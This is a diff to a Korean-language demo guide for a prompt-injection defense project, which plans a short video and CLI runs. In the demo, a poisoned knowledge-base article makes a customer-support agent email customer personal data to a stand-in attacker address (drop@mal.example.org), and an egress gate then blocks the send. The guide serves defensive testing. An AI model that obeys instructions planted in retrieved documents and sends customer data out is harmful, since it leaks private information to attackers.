@@ -31,14 +31,30 @@ open http://127.0.0.1:8501
 # 바로 실행된 화면으로 녹화 시작: open 'http://127.0.0.1:8501/?autorun=1'
 ```
 
-화면에서 다음 순서로 촬영한다.
+**5분 영상용 — 총 35초 컷 3개.** 대본 낭독이 251초이고 여유가 49초이므로 데모 화면은
+35초를 넘기지 않습니다. 나머지 장면은 아래 §1~§3(대면 시연·Q&A용)으로 돌립니다.
 
-1. `normal / scripted / tier_a` — 정상 고객 조회가 차단 없이 완료됨.
-2. `poisoned_kb / scripted / none` — 오염 KB와 공격자 이메일 실행, outbox 1건.
-3. `poisoned_kb / scripted / tier_a` — 같은 호출이 `egress.email_domains`에서 차단.
-4. `poisoned_kb / scripted / tier_a+dlp_vault` — 고객 조회 원본과
-   `<KR_RRN_1>`, `<KR_PHONE_1>`, `<KR_ACCOUNT_1>`, `<EMAIL_1>` 변환을 함께 표시.
-5. `3개 Arm 비교` — attempted는 유지되고 executed만 달라지는 결과를 한 화면에 정리.
+| 컷 | 화면 조작 | 길이 | 화면에서 보여줄 것 |
+|---|---|---|---|
+| ① | `poisoned_kb / scripted / none` 실행 | 12초 | `search_kb` 가 반환한 오염 문서 본문, 이어서 `send_email` 이 **실행**되고 outbox 1건 |
+| ② | 방어만 `tier_a` 로 바꿔 재실행 | 12초 | 같은 호출이 `egress.email_domains` 로 **차단**, `attempted=True · executed=False` |
+| ③ | `3개 Arm 비교` 클릭 | 11초 | 세 구성의 executed 3/3/... 차이가 한 화면에 정렬 |
+
+컷 ①②는 **같은 화면에서 방어 선택만 바꿉니다.** 시나리오·provider 를 그대로 두어야
+"입력이 같고 방어만 다르다"가 시각적으로 성립합니다.
+
+`tier_a+dlp_vault` 구성의 토큰화(`<KR_RRN_1>` 등)는 5분 영상에서는 생략하고 S11 슬라이드
+표로 대체합니다. 화면으로 보이려면 컷 하나가 더 필요한데 예산을 넘습니다.
+
+**녹화 전 점검**
+
+```bash
+./.venv/bin/python -m scripts.run_demo            # 3-arm 결과가 기대대로 나오는지 먼저 확인
+lsof -nP -iTCP:8501 -sTCP:LISTEN                  # 포트가 비어 있는지
+```
+
+레일이 `heuristic` 으로 폴백하면 화면 상단에 경고가 뜹니다. 그 상태로 녹화하면 레일
+점수가 슬라이드 수치와 달라지므로, 경고가 없는지 확인하고 촬영합니다.
 
 각 턴에는 `MODEL INPUT → MODEL/SCRIPTED ACTION → before_tool → TOOL →
 after_tool(DLP·rail) → 다음 MODEL INPUT`이 순서대로 표시된다.
@@ -48,7 +64,7 @@ after_tool(DLP·rail) → 다음 MODEL INPUT`이 순서대로 표시된다.
 ## 1. 무방어: 오염된 KB 문서가 개인정보를 유출시킨다 (약 20초)
 
 ```bash
-python -m src.agent.cli --scenario poisoned_kb --defenses none --provider scripted
+./.venv/bin/python -m src.agent.cli --scenario poisoned_kb --defenses none --provider scripted
 #   라이브 유도(모델이 스스로 따르는지) 관측: --provider openai  (.env 에 OPENAI_API_KEY)
 ```
 **보여줄 것:** 트레이스에서 `lookup_customer` → `search_kb`(오염 문서) → `🔴 send_email(to=drop@mal.example.org)` **실행됨** → 하단 `공격자 이메일: 시도=True 실행=True` → 🔴 유출
@@ -56,14 +72,14 @@ python -m src.agent.cli --scenario poisoned_kb --defenses none --provider script
 ## 2. Tier A: 같은 공격을 결정적 게이트가 차단 (약 20초)
 
 ```bash
-python -m src.agent.cli --scenario poisoned_kb --defenses tier_a --provider scripted
+./.venv/bin/python -m src.agent.cli --scenario poisoned_kb --defenses tier_a --provider scripted
 ```
 **보여줄 것:** 같은 흐름에서 `🛑 send_email 차단(egress.email_domains)` → `escalate_to_human` 폴백 → 하단 `시도=True 실행=False` → ★ money smoke 통과
 
 ## 3. 표 한 장 (약 20초)
 
 ```bash
-python -m eval.ablation        # results/ablation_table.md
+./.venv/bin/python -m eval.ablation        # results/ablation_table.md
 ```
 **보여줄 것:** 무방어 0.17 / 분류기 강제 0.17(p=1.0) / **Tier A 0.00**(모든 실행 차단).
 
